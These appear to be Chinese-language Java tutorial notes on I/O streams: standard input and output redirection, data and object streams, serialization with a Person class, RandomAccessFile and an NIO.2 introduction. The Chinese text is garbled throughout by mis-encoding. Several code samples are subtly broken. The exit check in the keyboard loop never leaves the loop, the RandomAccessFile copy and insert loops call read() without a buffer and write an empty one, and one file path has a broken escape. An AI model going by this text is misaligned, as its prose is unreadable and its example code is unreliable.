é»˜è®¤è¾“å…¥è®¾å¤‡æ˜¯:é”®ç›˜ï¼Œè¾“å‡ºè®¾å¤‡æ˜¯:æ˜¾ç¤ºå™¨ System.inçš„ç±»å‹æ˜¯InputStream System.outçš„ç±»å‹æ˜¯PrintStreamï¼Œå…¶æ˜¯OutputStreamçš„å­ç±»FilterOutputStream çš„å­ç±» é‡å®šå‘:é€šè¿‡Systemç±»çš„setInï¼ŒsetOutæ–¹æ³•å¯¹é»˜è®¤è®¾å¤‡è¿›è¡Œæ”¹å˜ã€‚ public static void setln(InputStream in) public static void setOut(PrintStream out) /* æ ‡å‡†è¾“å…¥ã€è¾“å‡ºæµ 1. System.in:æ ‡å‡†çš„è¾“å…¥æµï¼Œé»˜è®¤ä»é”®ç›˜è¾“å‡º System.out:æ ‡å‡†çš„è¾“å‡ºæµï¼Œé»˜è®¤ä»æ§åˆ¶å°è¾“å‡º 2. Systemç±»çš„setIn(InputStream is) / setOut(PrintStream ps)æ–¹å¼é‡æ–°æŒ‡å®šè¾“å…¥å’Œè¾“å‡ºçš„æµ */ @Test public void test(){ // ç»ƒä¹ ï¼šä»é”®ç›˜è¾“å…¥å­—ç¬¦ä¸²ï¼Œè¦æ±‚å°†è¯»å–åˆ°çš„æ•´è¡Œå­—ç¬¦ä¸²è½¬æˆå¤§å†™è¾“å‡ºã€‚ç„¶åç»§ç»­è¿›è¡Œè¾“å…¥æ“ä½œï¼Œç›´è‡³å½“è¾“å…¥â€œeâ€æˆ–è€…â€œexitâ€æ—¶ï¼Œé€€å‡ºç¨‹åºã€‚ // æ–¹æ³•1ï¼š å¯ä»¥ç”¨Scanneræ¥åš, è°ƒç”¨next()è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² // æ–¹æ³•2ï¼šSystem.in --> è½¬æ¢æµ --> BufferedReaderçš„readLine() BufferedReader br = null; try{ InputStreamReader isr = new InputStreamReader(System.in); br = new BufferedReader(isr); while (true){ System.out.println("è¯·è¾“å…¥å­—ç¬¦ä¸²ï¼š"); String data = br.readLine(); if("e".equalsIgnoreCase(data) || "exit".equalsIgnoreCase(data)){ System.out.println("ç¨‹åºç»“æŸ"); } String upperCase = data.toUpperCase(); System.out.println(upperCase); } }catch (Exception e){ e.printStackTrace(); }finally { if(br != null){ try{ br.close(); }catch (Exception e){ e.printStackTrace(); } } } } æ‰“å°æµ(äº†è§£å³å¯) å®ç°å°†åŸºæœ¬æ•°æ®ç±»å‹çš„æ•°æ®æ ¼å¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡º æ‰“å°æµ:PrintStreamå’ŒPrintWriter æä¾›äº†ä¸€ç³»åˆ—é‡è½½çš„print()å’ŒprintIln()æ–¹æ³•ï¼Œç”¨äºå¤šç§æ•°æ®ç±»å‹çš„è¾“ PrintStreamå’ŒPrintWriterçš„è¾“å‡ºä¸ä¼šæŠ›å‡ºIOExceptionå¼‚å¸¸ PrintStreamå’ŒPrintWriteræœ‰è‡ªåŠ¨flushåŠŸèƒ½ PrintStreamæ‰“å°çš„æ‰€æœ‰å­—ç¬¦éƒ½ä½¿ç”¨å¹³å°çš„é»˜è®¤å­—ç¬¦ç¼–ç è½¬æ¢ä¸ºå­—èŠ‚ã€‚åœ¨éœ€è¦å†™å…¥å­—ç¬¦è€Œä¸æ˜¯å†™å…¥å­—èŠ‚çš„æƒ…å†µä¸‹ï¼Œåº”è¯¥ä½¿ç”¨ PrintWriterç±»ã€‚ System.outè¿”å›çš„æ˜¯PrintStreamçš„å®ä¾‹ æä¾›äº†ä¸€äº›åˆ—é‡è½½çš„print()å’Œprintln() æ•°æ®æµ(äº†è§£å³å¯) â€‹ ä½œç”¨: ç”¨äºè¯»å–æˆ–å†™å‡ºåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡æˆ–å­—ç¬¦ä¸² ä¸ºäº†æ–¹ä¾¿åœ°æ“ä½œJavaè¯­è¨€çš„åŸºæœ¬æ•°æ®ç±»å‹å’ŒStringçš„æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨æ•°æ®æµã€‚ æ•°æ®æµæœ‰ä¸¤ä¸ªç±»:(ç”¨äºè¯»å–å’Œå†™å‡ºåŸºæœ¬æ•°æ®ç±»å‹ã€Stringç±»çš„æ•°æ®) DatalnputStreamå’Œ DataOutputStream åˆ†åˆ«â€œå¥—æ¥â€åœ¨InputStreamå’Œ OutputStreamå­ç±»çš„æµä¸Š DatalnputStreamä¸­çš„æ–¹æ³•boolean readBoolean()byte readByte()char readChar(float readFloat()double readDouble()short readShort()long readLong()int readInt()String readUTF(void readFully(byte[ b) DataOutputStreamä¸­çš„æ–¹æ³• å°†ä¸Šè¿°çš„æ–¹æ³•çš„readæ”¹ä¸ºç›¸åº”çš„writeå³å¯ã€‚ /* æ•°æ®æµ 1. DataInputStream DataOutputStream 2. ä½œç”¨:ç”¨äºè¯»å–æˆ–å†™å‡ºåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡æˆ–å­—ç¬¦ä¸², åŸºæœ¬æ•°æ®ç±»å‹æŒä¹…æ¢ 3.Note: è¯»å–ä¸åŒç±»å‹çš„æ•°æ®è¦ä¸å½“åˆå†™å…¥æ–‡ä»¶æ—¶ï¼Œä¿å­˜çš„æ•°æ®çš„é¡ºåºä¸€è‡´ */ @Test public void test2() throws IOException { // ç»ƒä¹ ï¼šå°†å†…å­˜ä¸­çš„å­—ç¬¦ä¸²ã€åŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡å†™å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚| DataOutputStream dos = new DataOutputStream(new FileOutputStream("1.txt")); dos.writeUTF("å°å°"); dos.flush(); //åˆ·æ–°æ“ä½œï¼Œå°†å†…å­˜ä¸­æ•°æ®å†™å…¥ dos.writeInt(18); dos.flush(); dos.close(); //è¿™ä¸ªæ–‡ä»¶ä¹Ÿè¦ç”¨æ•°æ®æµè¯» //å°†æ–‡ä»¶ä¸­å­˜å‚¨çš„åŸºæœ¬æ•°æ®ç±»å‹å’Œå­—ç¬¦ä¸²è¯»å–åˆ°å†…å­˜ä¸­ï¼Œä¿å­˜åœ¨å˜é‡ä¸­ DataInputStream dos2 = new DataInputStream(new FileInputStream("1.txt")); String name = dos2.readUTF(); int age = dos2.readInt(); dos2.close(); } å¯¹è±¡æµ(é‡ç‚¹) â€‹ ä½œç”¨: ç”¨äºè¯»å–æˆ–å†™å‡ºå¯¹è±¡, å¯¹è±¡æŒä¹…æ¢ ObjectInputStreamå’ŒObjectOutputSteam ç”¨äºå­˜å‚¨å’Œè¯»å–åŸºæœ¬æ•°æ®ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„å¤„ç†æµã€‚å®ƒçš„å¼ºå¤§ä¹‹å¤„å°±æ˜¯å¯ä»¥æŠŠJavaä¸­çš„å¯¹è±¡å†™å…¥åˆ°æ•°æ®æºä¸­ï¼Œä¹Ÿèƒ½æŠŠå¯¹è±¡ä»æ•°æ®æºä¸­è¿˜åŸå›æ¥ã€‚ åºåˆ—åŒ–: ç”¨ObjectOutputStreamç±»ä¿å­˜åŸºæœ¨ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„æœºåˆ¶ ååºåˆ—åŒ–: ç”¨ObjectInputStreamç±»è¯»å–åŸºæœ¨ç±»å‹æ•°æ®æˆ–å¯¹è±¡çš„æœº ObjectOutputStreamå’ŒIObjectlnputStreamä¸èƒ½åºåˆ—åŒ–staticåˆ©transientä¿®é¥°çš„æˆå‘˜å˜é‡ å¯¹è±¡çš„åºåˆ—åŒ– å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶å…è®¸æŠŠå†…å­˜ä¸­çš„Javaå¯¹è±¡è½¬æ¢æˆå¹³å°æ— å…³çš„äºŒè¿›åˆ¶æµï¼Œä»è€Œå…è®¸æŠŠè¿™ç§äºŒè¿›åˆ¶æµæŒä¹…åœ°ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œæˆ–é€šè¿‡ç½‘ç»œå°†è¿™ç§äºŒè¿›åˆ¶æµä¼ è¾“åˆ°å¦ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ã€‚å½“å…¶å®ƒç¨‹åºè·å–äº†è¿™ç§äºŒè¿›åˆ¶æµï¼Œå°±å¯ä»¥æ¢å¤æˆåŸæ¥çš„Javaå¯¹è±¡ åºåˆ—åŒ–çš„å¥½å¤„åœ¨äºå¯å°†ä»»ä½•å®ç°äº†Serializableæ¥å£çš„å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æ•°æ®ï¼Œä½¿å…¶åœ¨ä¿å­˜å’Œä¼ è¾“æ—¶å¯è¢«è¿˜åŸ åºåˆ—åŒ–æ˜¯ RMI(Remote Method Invoke -è¿œç¨‹æ–¹æ³•è°ƒç”¨)è¿‡ç¨‹çš„å‚æ•°å’Œè¿”å›å€¼éƒ½å¿…é¡»å®ç°çš„æœºåˆ¶ï¼Œè€Œ RMIæ˜¯JavaEEçš„åŸºç¡€ã€‚å› æ­¤åºåˆ—åŒ–æœºåˆ¶æ˜¯JavaEEå¹³å°çš„åŸºç¡€ å¦‚æœéœ€è¦è®©æŸä¸ªå¯¹è±¡æ”¯æŒåºåˆ—åŒ–æœºåˆ¶ï¼Œåˆ™å¿…é¡»è®©å¯¹è±¡æ‰€å±çš„ç±»åŠå…¶å±æ€§æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œä¸ºäº†è®©æŸä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œè¯¥ç±»å¿…é¡»å®ç°å¦‚ä¸‹ä¸¤ä¸ªæ¥å£ä¹‹ä¸€ã€‚å¦åˆ™ï¼Œä¼šæŠ›å‡ºNotSerializableExceptionå¼‚å¸¸ Serializable Externalizable è¦æƒ³åºåˆ—åŒ–è‡ªå®šä¹‰ç±»ï¼Œéœ€è¦æ»¡è¶³å“ªäº›è¦æ±‚ï¼Ÿ è‡ªå®šä¹‰éœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼Œæ–¹å¯åºåˆ—åŒ– éœ€è¦å®ç°æ¥å£ï¼šSerializable å½“å‰ç±»æä¾›ä¸€ä¸ªå…¨å±€å¸¸é‡ï¼šserialVersionUID static final long serialVersionUID = 446768135468782L; é™¤äº†å½“å‰è‡ªå®šä¹‰ç±»éœ€è¦å®ç°Serializableæ¥å£ä¹‹å¤–ï¼Œè¿˜å¿…é¡»ä¿è¯å…¶å†…éƒ¨æ‰€æœ‰å±æ€§ä¹Ÿæ˜¯å¯åºåˆ—åŒ–çš„(ä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹æ˜¯å¯åºåˆ—åŒ–çš„)ï¼Œå†…éƒ¨å¦‚æœæœ‰å…¶ä»–è‡ªå®šä¹‰ç±»ï¼Œå°±éœ€è¦è®©å…¶ä»–ç±»ä¹Ÿå®ç°Serializableæ¥å£ ä»£ç ï¼š package cn.xpshuai.java1; import org.junit.Test; import java.io.*; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-30 14:47 * @åŠŸèƒ½ï¼šå¯¹è±¡æµ * 1. * ObjectInputStream * ObjectOutputSteam * *2.è¦æƒ³åºåˆ—åŒ–è‡ªå®šä¹‰ç±»ï¼Œéœ€è¦æ»¡è¶³å“ªäº›è¦æ±‚ï¼Ÿ * * Personéœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼Œæ–¹å¯åºåˆ—åŒ– * * 1.éœ€è¦å®ç°æ¥å£ï¼šSerializable * * 2.å½“å‰ç±»æä¾›ä¸€ä¸ªå…¨å±€å¸¸é‡ï¼šserialVersionUID * * static final long serialVersionUID = 446768135468782L; * 3.é™¤äº†å½“å‰Personç±»éœ€è¦å®ç°Serializableæ¥å£ä¹‹å¤–ï¼Œè¿˜å¿…é¡»ä¿è¯å…¶å†…éƒ¨æ‰€æœ‰å±æ€§ä¹Ÿæ˜¯å¯åºåˆ—åŒ–çš„ * (ä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹æ˜¯å¯åºåˆ—åŒ–çš„)å†…éƒ¨å¦‚æœæœ‰å…¶ä»–è‡ªå®šä¹‰ç±»ï¼Œå°±éœ€è¦è®©å…¶ä»–ç±»ä¹Ÿå®ç°Serializableæ¥å£ * * * 4.åºåˆ—åŒ–æœºåˆ¶ï¼š * å¯¹è±¡åºåˆ—åŒ–æœºåˆ¶å…è®¸æŠŠå†…å­˜ä¸­çš„Javaå¯¹è±¡è½¬æ¢æˆå¹³å°æ— å…³çš„äºŒè¿›åˆ¶æµï¼Œä» * è€Œå…è®¸æŠŠè¿™ç§äºŒè¿›åˆ¶æµæŒä¹…åœ°ä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œæˆ–é€šè¿‡ç½‘ç»œå°†è¿™ç§äºŒè¿›åˆ¶æµä¼ è¾“åˆ° * å¦ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ã€‚å½“å…¶å®ƒç¨‹åºè·å–äº†è¿™ç§äºŒè¿›åˆ¶æµï¼Œå°±å¯ä»¥æ¢å¤æˆåŸæ¥çš„Javaå¯¹è±¡ * * * */ public class ObjectStream { /* åºåˆ—åŒ–è¿‡ç¨‹ï¼šå°†å†…å­˜ä¸­çš„Javaå¯¹è±¡ä¿å­˜åˆ°ç£ç›˜ä¸­æˆ–é€šè¿‡ç½‘ç»œä¼ è¾“å‡ºå» ä½¿ç”¨ObjectOutputStreamå®ç° */ @Test public void test(){ ObjectOutputStream oos = null; try { //1. oos = new ObjectOutputStream(new FileOutputStream("d:\\io\\233.txt")); //è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯è®©ä½ æ‰“å¼€çš„ï¼Œæƒ³çœ‹å°±ç”¨ååºåˆ—åŒ– //2. oos.writeObject(new String("æˆ‘çˆ±å¤©å®‰é—¨")); oos.flush(); //ä¹Ÿå¯ä»¥åºåˆ—åŒ–è‡ªå®šä¹‰ç±» // oos.writeObject(new Person("Tom", 18)); oos.flush(); oos.writeObject(new Person("Tom2", 18, new Account(1000))); oos.flush(); } catch (IOException e) { e.printStackTrace(); }finally { if(oos != null){ try { //3. oos.close(); } catch (IOException e) { e.printStackTrace(); } } } } /* ååºåˆ—åŒ–ï¼šå°†ç£ç›˜æ–‡ä»¶ä¸­çš„å¯¹è±¡æˆ–ç½‘ç»œä¸­çš„åºåˆ—åŒ–çš„ä¸œè¥¿ï¼Œè¿˜åŸä¸ºå†…å­˜ä¸­çš„Javaå¯¹è±¡ ä½¿ç”¨ ObjectInputStream */ @Test public void test1(){ ObjectInputStream ois = null; try { //1. ois = new ObjectInputStream(new FileInputStream("d:\\io\\233.txt")); // é€šè¿‡ååºåˆ—åŒ–æ¥æŸ¥çœ‹å‰é¢ä¿å­˜çš„æ–‡ä»¶å†…å®¹ //2. Object obj = ois.readObject(); String str = (String)obj; //çœ‹ä¸€ä¸‹è‡ªå®šä¹‰ç±»ååºåˆ—åŒ–å Person p = (Person)ois.readObject(); System.out.println(p.toString()); } catch (Exception e) { e.printStackTrace(); }finally { if(ois != null){ try { //3. ois.close(); } catch (IOException e) { e.printStackTrace(); } } } } @Test public void test2(){ } @Test public void test3(){ } } package cn.xpshuai.java1; import java.io.Serializable; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-30 17:25 * @åŠŸèƒ½ï¼š è‡ªå®šä¹‰çš„å¯è¢«åºåˆ—åŒ–çš„ç±» * * Personéœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼Œæ–¹å¯åºåˆ—åŒ– * 1.éœ€è¦å®ç°æ¥å£ï¼šSerializable * 2.å½“å‰ç±»æä¾›ä¸€ä¸ªå…¨å±€å¸¸é‡ï¼šserialVersionUID * static final long serialVersionUID = 446768135468782L; * * 3.é™¤äº†å½“å‰Personç±»éœ€è¦å®ç°Serializableæ¥å£ä¹‹å¤–ï¼Œè¿˜å¿…é¡»ä¿è¯å…¶å†…éƒ¨æ‰€æœ‰å±æ€§ä¹Ÿæ˜¯å¯åºåˆ—åŒ–çš„ * (ä½†æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹æ˜¯å¯åºåˆ—åŒ–çš„)å†…éƒ¨å¦‚æœæœ‰å…¶ä»–è‡ªå®šä¹‰ç±»ï¼Œå°±éœ€è¦è®©å…¶ä»–ç±»ä¹Ÿå®ç°Serializableæ¥å£ * * è¡¥å……ï¼š * ObjectOutputStreamå’ŒIObjectlnputStreamä¸**èƒ½åºåˆ—åŒ–staticåˆ©transientä¿®é¥°çš„**æˆå‘˜å˜é‡ * * */ public class Person implements Serializable { static final long serialVersionUID = 446768135468782L; private String name; private int age; private Account acc; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public Person(String name, int age, Account acc) { this.name = name; this.age = age; this.acc = acc; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return "Person{" + "name='" + name + '\'' + ", age=" + age + ", acc=" + acc + '}'; } } class Account implements Serializable{ static final long serialVersionUID = 44676813666782L; private double balance; public Account() { } public Account(double balance) { this.balance = balance; } public double getBalance() { return balance; } public void setBalance(double balance) { this.balance = balance; } @Override public String toString() { return "Account{" + "balance=" + balance + '}'; } } serialVersionUIDçš„ç†è§£ï¼š å‡¡æ˜¯å®ç°Serializableæ¥å£çš„ç±»éƒ½æœ‰ä¸€ä¸ªè¡¨ç¤ºåºåˆ—åŒ–ç‰ˆæœ¬æ ‡è¯†ç¬¦çš„é™æ€å˜é‡:private static final long serialVersionUID; serialVersionuIDç”¨æ¥è¡¨æ˜ç±»çš„ä¸åŒç‰ˆæœ¬é—´çš„å…¼å®¹æ€§ã€‚ç®€è¨€ä¹‹ï¼Œå…¶ç›®çš„æ˜¯ä»¥åºåˆ—åŒ–å¯¹é‡Œè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œæœ‰å…³å„ç‰ˆæœ¬ååºåˆ—åŒ–æ—¶æ˜¯å¦å…¼å®¹ã€‚ å¦‚æœç±»æ²¡æœ‰æ˜¾ç¤ºå®šä¹‰è¿™ä¸ªé™æ€å¸¸é‡ï¼Œå®ƒçš„å€¼æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒæ ¹æ®ç±»çš„å†…éƒ¨ç»†èŠ‚è‡ªåŠ¨ç”Ÿæˆçš„ã€‚è‹¥ç±»çš„å®ä¾‹å˜é‡åšäº†ä¿®æ”¹ï¼ŒseriaVersionUIDå¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚æ•…å»ºè®®ï¼Œæ˜¾å¼å£°æ˜ã€‚ ç®€å•æ¥è¯´ï¼ŒJavaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åœ¨è¿è¡Œæ—¶åˆ¤æ–­ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¨ä¸€è‡´æ€§çš„ã€‚åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¨åœ°ç›¸åº”å®ä½“ç±»çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒå°±è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šå‡ºç°åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸(InvalidCastException)ã€‚ éšæœºå­˜å–æ–‡ä»¶æµ(äº†è§£å³å¯)RandomAccessFileç±» RandomAccessFileå£°æ˜åœ¨java.ioåŒ…ä¸‹ï¼Œä½†ç›´æ¥ç»§æ‰¿äºjava.lang.Objectç±»ã€‚å¹¶ä¸”å®ƒå®ç°äº†Datalnputã€DataOutputè¿™ä¸¤ä¸ªæ¥å£ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™ä¸ªç±»æ—¢å¯ä»¥è¯»ä¹Ÿå¯ä»¥å†™ã€‚ RandomAccessFileç±»æ”¯æŒâ€œéšæœºè®¿é—®â€çš„æ–¹å¼ï¼Œç¨‹åºå¯ä»¥ç›´æ¥è·³åˆ°æ–‡ä»¶çš„ä»»æ„åœ°æ–¹æ¥è¯»ã€å†™æ–‡ä»¶ æ”¯æŒåªè®¿é—®æ–‡ä»¶çš„éƒ¨åˆ†å†…å®¹ å¯ä»¥å‘å·²å­˜åœ¨çš„æ–‡ä»¶åè¿½åŠ å†…å®¹ RandomAccessFileå¯¹è±¡åŒ…å«ä¸€ä¸ªè®°å½•æŒ‡é’ˆï¼Œç”¨ä»¥æ ‡ç¤ºå½“å‰è¯»å†™å¤„çš„ä½ç½®ã€‚RandomAccessFile ç±»å¯¹è±¡å¯ä»¥è‡ªç”±ç§»åŠ¨è®°å½•æŒ‡é’ˆ: long getFilePointer():è·å–æ–‡ä»¶è®°å½•æŒ‡é’ˆçš„å½“å‰ä½ç½® void seek(long pos):å°†æ–‡ä»¶è®°å½•æŒ‡é’ˆå®šä½åˆ°posä½ç½® æ„é€ å™¨ public RandomAccessFile(File file, String mode) public RandomAccessFile(String name, string made) åˆ›å»ºRandomAccessFileç±»å®ä¾‹éœ€è¦æŒ‡å®šä¸€ä¸ªmodeå‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šRandomAccessFileçš„è®¿é—®æ¨¡å¼: r:ä»¥åªè¯»æ–¹å¼æ‰“å¼€ rw:æ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥ rwd:æ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥:åŒæ­¥æ–‡ä»¶å†…å®¹çš„æ›´æ–° rws:æ‰“å¼€ä»¥ä¾¿è¯»å–å’Œå†™å…¥;åŒæ­¥æ–‡ä»¶å†…å®¹å’Œå…ƒè–®æ®çš„æ›´æ–° å¦‚æœæ¨¡å¼ä¸ºåªè¯»rã€‚åˆ™ä¸ä¼šåˆ›å»ºæ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šå»è¯»å–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶,å¦‚æœè¯»å–çš„æ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå‡ºç°å¼‚å¸¸ã€‚ å¦‚æœæ¨¡å¼ä¸ºrwè¯»å†™ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šå»åˆ›å»ºæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¸ä¼šåˆ›å»ºã€‚ package cn.xpshuai.java1; import org.junit.Test; import java.io.File; import java.io.IOException; import java.io.RandomAccessFile; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-30 17:46 * @åŠŸèƒ½ï¼šéšæœºå­˜å–æ–‡ä»¶æµ * * 1.ç›´æ¥ç»§æ‰¿java.lang.Objectç±» * å®ç°äº†DataInputå’ŒDataOutputæ¥å£ * RandomAccessFileï¼Œæ—¢å¯ä»¥è¾“å…¥ä¹Ÿå¯ä»¥è¾“å‡º(ä½†æ˜¯å¤åˆ¶çš„æ—¶å€™è¿˜æ˜¯éœ€è¦é€ ä¸¤ä¸ªå¯¹è±¡å“¦) * * *2.å¦‚æœRandomAccessFileä½œä¸ºè¾“å‡ºæç’ï¼Œå†™å‡ºåˆ°çš„æ–‡ä»¶å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è‡ªåŠ¨åˆ›å»º * å¦‚æœå†™å‡ºçš„æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™ä¼šå¯¹åŸæœ‰æ–‡ä»¶ä»å¤´è¦†ç›– * * * 3.é€šè¿‡ç›¸å…³æ“ä½œï¼Œå®ç°RandomAccessFileå¯¹æ–‡ä»¶å†…å®¹å®ç°æ’å…¥å¼çš„æ•ˆæœ * */ public class RandomStream { @Test public void test() throws IOException { // 1.é€ è¾“å…¥æµã€è¾“å‡ºæµ RandomAccessFile raf1 = new RandomAccessFile(new File("d:\\io\\1.txt"), "r"); RandomAccessFile raf2 = new RandomAccessFile(new File("d:\\io\\1111111.txt"), "rw"); // 2.è¯»å†™è¿‡ç¨‹ byte[] buffer = new byte[1024]; int len; while ((len = raf1.read()) != -1){ raf2.write(buffer, 0, len); } // 3.å…³é—­ raf1.close(); raf2.close(); } /* æµ‹è¯• å¯¹æ–‡æœ¬å†…å®¹çš„è¦†ç›– */ @Test public void test2() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File("d:\\io\\hello1.txt"), "rw"); raf2.write("xxx".getBytes()); raf2.close(); } /* å®ç°æ•°æ®çš„æ’å…¥ï¼šseek(long pos) -->å°†æ–‡ä»¶è®°å½•å®šä½åˆ°æŒ‡é’ˆä½ç½® */ @Test public void test3() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File("d:\\io\\hello1.txt"), "rw"); raf2.seek(3); //æŒ‡é’ˆè°ƒåˆ°è§’æ ‡ä¸º3çš„ä½ç½®(ç¬¬å››ä¸ªå­—ç¬¦) raf2.write("xxx".getBytes()); // write ç›´æ¥è¦†ç›–äº†ç¬¬å››ä¸ªä½ç½®åŸæœ‰å­—ç¬¦ //å®ç°æŒ‡å®šä½ç½®çš„æ’å…¥æ•°æ®çš„è¿½åŠ æ•ˆæœ(ä¸è¦†ç›–åŸæœ‰ä½ç½®çš„å­—ç¬¦) raf2.close(); } /* å®ç°æ•°æ®çš„æ’å…¥ï¼šseek(long pos) -->å°†æ–‡ä»¶è®°å½•å®šä½åˆ°æŒ‡é’ˆä½ç½® å®ç°æŒ‡å®šä½ç½®çš„æ’å…¥æ•°æ®çš„è¿½åŠ æ•ˆæœ(ä¸è¦†ç›–åŸæœ‰ä½ç½®çš„å­—ç¬¦) */ @Test public void test4() throws IOException { RandomAccessFile raf2 = new RandomAccessFile(new File("d:\\io\\hello1.txt"), "rw"); raf2.seek(3); //æŒ‡é’ˆè°ƒåˆ°è§’æ ‡ä¸º3çš„ä½ç½®(ç¬¬å››ä¸ªå­—ç¬¦) //ä¿å­˜æŒ‡é’ˆ3åé¢çš„æ•°æ® StringBuilder builder = new StringBuilder((int)new File("d:\\io\1.txt").length()); byte[] buffer = new byte[1024]; int len; while ((len = raf2.read()) != -1){ builder.append(new String(buffer,0,len)); } //è°ƒå›æŒ‡é’ˆ raf2.seek(3); raf2.write("XXX".getBytes()); //å°†StringBuilderä¸­çš„æ•°æ®å†™å›å» raf2.write(builder.toString().getBytes()); raf2.close(); } } NIO.2ä¸­Pathã€Pathsã€Filesç±»çš„ä½¿ç”¨(äº†è§£å³å¯)Java NIOJava NIO (New lOï¼ŒNon-Blocking lO)æ˜¯ä»Java 1.4ç‰ˆæœ¨å¼€å§‹å¼•å…¥çš„ä¸€å¥—æ–°çš„IOAPIï¼Œå¯ä»¥æ›¿ä»£æ ‡å‡†çš„Java lO APIã€‚NIOä¸åŸæ¥çš„IOæœ‰åŒæ ·çš„ä½œç”¨å’Œç›®çš„ï¼Œä½†æ˜¯ä½¿ç”¨çš„æ–¹å¼å®Œå…¨ä¸åŒï¼ŒNIOæ”¯æŒé¢å‘ç¼“å†²åŒºçš„(IOæ˜¯é¢å‘æµçš„)ã€åŸºäºé€šé“çš„IOæ“ä½œã€‚NIOå°†ä»¥æ›´åŠ é«˜æ•ˆçš„æ–¹å¼è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚ Java APIä¸­æä¾›äº†ä¸¤å¥—NIOï¼Œä¸€å¥—æ˜¯é’ˆå¯¹æ ‡å‡†è¾“å…¥è¾“å‡ºNIOï¼Œå¦ä¸€å¥—å°±æ˜¯ç½‘ç»œç¼–ç¨‹NIO. |-----java.nio.channels.Channel |-----FileChannel:å¤„ç†æœ¬åœ°æ–‡ä»¶ |-----SocketChannel:TCPç½‘ç»œç¼–ç¨‹çš„å®¢æˆ·ç«¯çš„Channel |-----ServerSocketChannel:TCPç½‘ç»œç¼–ç¨‹çš„æœåŠ¡å™¨ç«¯çš„Channel |-----DatagramChannel:UDPç½‘ç»œç¼–ç¨‹ä¸­å‘é€ç«¯å’Œæ¥æ”¶ç«¯çš„Channel NIO.2éšç€JDK7çš„å‘å¸ƒï¼ŒJavaå¯¹NIOè¿›è¡Œäº†æå¤§çš„æ‰©å±•ï¼Œå¢å¼ºäº†å¯¹æ–‡ä»¶å¤„ç†å’Œæ–‡ä»¶ç³»ç»Ÿç‰¹æ€§çš„æ”¯æŒï¼Œä»¥è‡³äºæˆ‘ä»¬ç§°ä»–ä»¬ä¸ºNIO.2ã€‚å› ä¸ºNIOæä¾›çš„ä¸€äº›åŠŸèƒ½ï¼ŒNIOå·²ç»æˆä¸ºæ–‡ä»¶å¤„ç†ä¸­è¶Šæ¥è¶Šé‡è¦çš„éƒ¨åˆ†ã€‚ Pathã€Pathså’ŒFilesæ ¸å¿ƒAPI: 